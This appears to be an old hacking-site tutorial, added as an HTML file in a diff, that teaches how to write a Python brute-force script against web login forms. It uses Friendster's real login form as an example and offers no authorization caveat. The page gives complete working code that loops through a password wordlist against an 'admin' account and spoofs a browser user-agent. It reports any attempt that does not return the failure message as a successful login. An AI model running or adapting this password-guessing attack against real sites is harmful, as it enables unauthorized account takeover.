@@ -1,0 +1,265 @@
+<html><head>
+
+
+<meta http-equiv="Content-Language" content="en-us">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>Writing Brute Force Tool w/ Python</title>
+</head><body>
+
+<pre><font size="3"><h2>Writing Brute Force Tool w/ Python</h2> 
+				
+<h4>by d3hydr8 &gt; www.darkc0de.com</h4>
+date: 09/15/09
+
+Description:
+
+This tutorial will help you build your own brute force tool for a 
+simple web form. It will use minimal python code with explanations.
+This is only one technique I use and my c0de so if there is a better
+way or c0de. Pat yourself on the back. Enough with the boring 
+intro crap...
+
+First, we need a web form to brute force. Well, first lets get this
+out of the way. I have had people say that this really isn't a brute
+force attack. Here is your definition of brute force:
+
+In cryptanalysis, a brute force attack is a method of defeating a cryptographic 
+scheme by trying a large number of possibilities; for example, possible keys in 
+order to decrypt a message.
+
+Here is that same definition chopped down:
+
+a brute force attack is a method of defeating by trying a large number of 
+possibilities; for example, possible keys.
+
+There now it sounds about right. :)
+
+Moving on. 
+
+Our simple web-form we are going to use looks like this:
+
+<img src="/tutorials/imgs/login.png">
+
+And here is the source.
+
+---------------------------------------------------------------------</font></pre>
+<pre><font size="3"><span style="background-color: rgb(204, 204, 204);">
+&lt;html&gt;
+&lt;form method="POST" action="http://www.site.com/login.php"&gt;
+  Username: &lt;input type="text" name="username" size="15" />&lt;br /&gt;
+  Password: &lt;input type="password" name="password" size="15" />&lt;br /&gt;
+    &lt;p&gt;&lt;input type="submit" value="Login" />&lt;/p&gt;
+&lt;/form&gt;
+&lt;/html&gt;
+
+</span>
+---------------------------------------------------------------------
+</font></pre>
+<pre><font size="3">
+
+Pretty simple right. We can see that 2 pieces of information are going to be
+sent to "http://www.site.com/login.php", username and password.
+Now more times then not your web form will be more difficult than this. 
+There is a good tool right in your firefox browser that can help you get 
+these values. 
+
+Go to: Tools >> Page Info and there will be a button called Forms. If you 
+don't see this option it was taken out with Firefox >= 3.0. No fear here 
+is a link to the extension that can give you this option back.
+
+https://addons.mozilla.org/en-US/firefox/addon/7978
+
+Now this is what that form above looks like with our new firefox addon.
+
+<img src="/tutorials/imgs/formsaddon.png">
+
+
+This gives you the same information as the source but looks cleaner. When
+you get those 15 variable forms this can save you a lot of time and 
+headache. Speaking of saving time, Ctrl-I is the shortcut for Page Info.
+
+For an example lets look at Friendster.com's login form.
+
+---------------------------------------------------------------------</font></pre>
+<pre><font size="3"><span style="background-color: rgb(204, 204, 204);">
+
+&lt;form name="login_form" method="post" action="/login.php"&gt;
+&lt;input type="hidden" name="_submitted" value="1"&gt;&lt;input type="hidden" name="next" value="/"&gt;&lt;input type="hidden" name="tzoffset" value=""&gt;&lt;script language="JavaScript"&gt;
+          var now = new Date();
+          document.login_form.tzoffset.value = now.getTimezoneOffset();
+        &lt;/script&gt;&lt;table cellpadding="3" cellspacing="0" border="0"&gt;
+&lt;tr&gt;
+&lt;td style="text-align:right !important;color:#fff"&gt;&lt;strong&gt;Email:&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;input type="text" name="email" maxlength="100" alt="Email Address" style="width: 150px !important;" value="">&lt;/td>
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align:right !important;color:#fff"&gt;&lt;strong&gt;Password:&lt;/strong>&lt;/td&gt;
+&lt;td>&lt;input type="password" name="password" maxlength="10" onkeypress="submitLogin()" style="width: 150px !important;"&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;/td&gt;
+
+&lt;td&gt;
+&lt;input type="checkbox" name="remembermyemail" id="remembermyemail"&gt;&lt;span class="medium"&gt;&lt;label for="remembermyemail" style="color:#fff"&gt;Remember me&lt;/label&gt;&lt;/span&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td valign="bottom"&gt;&lt;div class="loginButton clearFix"&gt;
+&lt;div class="clearfix"&gt;&lt;a href="#" class="greyButton" onclick="document.login_form.submit()">&lt;span>Log In&lt;/span&gt;&lt;/a&gt;&lt;/div&gt;
+&lt;input type="submit" style="display:none"&gt;
+&lt;/div&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&gt;/td&gt;
+&lt;td>&lt;span class="medium"&gt;&lt;a href="/forgotpassword.php" style="color:#fff"&gt;Forgot password?&lt;/a>&lt;/span>&lt;/td&gt;
+
+&lt;/tr&gt;
+&lt;/table&gt;
+&lt;/form&gt;
+
+</span><span style="background-color: rgb(255, 255, 255);">---------------------------------------------------------------------</span></font></pre>
+<pre><font size="3"><span style="background-color: rgb(255, 255, 255);">
+Now lets look at it with the firefox extension.
+
+<img src="/tutorials/imgs/friendster.png">
+
+So, as you can see this extension will help you out. 
+
+Back to our form. 
+We can see that we need to send multiple username,password to login.php and test the 
+output.
+
+Lets start some python code 
+
+This line just tells the system execution library to
+treat the script as standard input to the interpreter.
+</span>
+---------------------------------------------------------------------</font></pre>
+<pre><font color="#00ffff"></font><font size="3"><span style="background-color: rgb(204, 204, 204);">
+#!/usr/bin/python
+</span>
+---------------------------------------------------------------------</font></pre>
+<pre><font size="3">
+
+This next line will load our modules that are needed. You can think 
+of modules as separate little tools python code will use. 
+
+You can read more about these modules here:
+
+http://docs.python.org/lib/module-urllib2.html
+http://docs.python.org/lib/module-urllib.html
+http://docs.python.org/lib/module-re.html
+
+---------------------------------------------------------------------</font></pre>
+<pre><font size="3"><span style="background-color: rgb(204, 204, 204);">
+import urllib2, re, urllib
+</span>
+---------------------------------------------------------------------
+</font></pre>
+<pre><font size="3">
+
+Next lets setup some variables which will help keep the code clean
+and easier to modify.
+
+The first variable HOST we get from our web form.
+
+&lt;form method="POST" action="http://www.site.com/login.php"&gt;
+
+The second variable is going to be the user to brute-force. (admin, root, etc.)
+
+The third is just the location of our wordlist.
+
+The last variable ERROR is what the site sends back as a bad login.
+(This will help us check if we get a correct match)
+
+---------------------------------------------------------------------</font></pre>
+<pre><font size="3"><span style="background-color: rgb(204, 204, 204);">
+HOST = "http://www.site.com/login.php"
+USER = "admin"
+WORDLIST = "/home/d3hydr8/wordlist.txt"
+ERROR = "Login Failed!!!"
+</span></font></pre>
+<pre><font size="3">---------------------------------------------------------------------
+
+This next code will load our WORDLIST we specified above and create a list called 
+"words" with it and tell us how many words are loaded.
+
+</font></pre>
+<pre><font size="3">---------------------------------------------------------------------</font></pre>
+<pre><font size="3"><span style="background-color: rgb(204, 204, 204);">
+words = open(WORDLIST, "r").readlines()
+print "[+] Words Loaded:",len(words)
+</span>
+---------------------------------------------------------------------</font></pre>
+<pre><font size="3">
+
+This next block is the meat of the script. We will go through the list of words, create our 
+form with the information, encode that form and then apply that to HOST (login.php) and get the
+source back. I've added comments above each line to help you understand.
+
+---------------------------------------------------------------------</font></pre>
+<pre><font size="3"><span style="background-color: rgb(204, 204, 204);">
+#This is our for loop to go through each word in our wordlist.
+for word in words:
+
+	#This line will remove newlines from each word.
+	word = word.replace("\n","")
+	
+	#Create our form with the information provided from the web form and
+	#USER variable. Using the word from the loop.
+	login_form_seq = [
+     	('username', USER),
+	('password', word)]
+
+	#Encode the data using the urllib module.
+	login_form_data = urllib.urlencode(login_form_seq)
+
+	#Create an opener from the HOST variable.
+	opener = urllib2.build_opener(HOST)
+
+	#Add a user-agent so we look like a web browser.
+	opener.addheaders = [('User-agent', 'Mozilla/5.0')]
+
+	#Get the source from the site using our form. 
+	source = opener.open(HOST, login_form_data).read()
+
+</span>
+---------------------------------------------------------------------</font></pre>
+<pre><font size="3">
+Ok, now at this point we have created our web-form and sent it to the site (login.php). 
+The site has checked our information and sent us back source code. What we want to do is check 
+our source code for the ERROR variable we set earlier. 
+
+What this line is basically saying is:
+
+If ERROR (Login Failed!!!) is not in source then you have successful login. 
+
+---------------------------------------------------------------------</font></pre>
+<pre><font size="3"><span style="background-color: rgb(204, 204, 204);">
+	if re.search(ERROR,source) == None:
+		print "Successful Login:",USER, word
+</span>
+--------------------------------------------------------------------</font></pre>
+
+<pre><font size="3">This is your very basic web-form and code. This technique
+can give false positives on bad http responses and other things. Added more 
+re.search statements is not hard to catch these or if you know what a successful
+login message looks like. Use that and take == None off your re.search statement.
+Sometimes you might get a site saying you need cookies enabled. There are several 
+python modules you can use to get around this (CookieJar) but is beyond the scope
+of this tutorial.
+
+I have several scripts in my brute force section using this type of code. Check them
+out for more help and ideas. 
+
+This tutorial was to give a basic overview and hopefully get you writing your 
+own tools and experimenting with c0de. 
+
+
+www.darkc0de.com
+d3hydr8[at]gmail[dot]com
+</pre>
+<pre>&nbsp;</pre>
+
+</body></html>
